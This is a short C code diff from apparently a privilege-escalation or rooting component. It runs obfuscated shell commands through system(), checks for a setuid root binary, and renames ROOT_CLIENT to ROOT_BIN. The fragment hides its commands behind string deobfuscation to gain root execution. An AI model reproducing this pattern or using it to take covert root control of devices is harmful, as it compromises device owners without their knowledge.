@@ -52,13 +52,13 @@ int check_setuid(char *shell) {
   snprintf(shell_cmd, sizeof(shell_cmd), deobfuscate(rt), shell);
   system(shell_cmd);
 
-  if(stat(deobfuscate(ROOT_CLIENT), &st) < 0) {
+  if(stat(deobfuscate(ROOT_BIN), &st) < 0) {
     LOGD("Suidext failed");
     return 0;
   }
 
   memset(shell_cmd, 0, sizeof(shell_cmd));
-  snprintf(shell_cmd, sizeof(shell_cmd), "%s %s", deobfuscate(ROOT_CLIENT), deobfuscate(air));
+  snprintf(shell_cmd, sizeof(shell_cmd), "%s %s", deobfuscate(ROOT_BIN), deobfuscate(air));
 
   LOGD("Exec %s", shell_cmd);
 
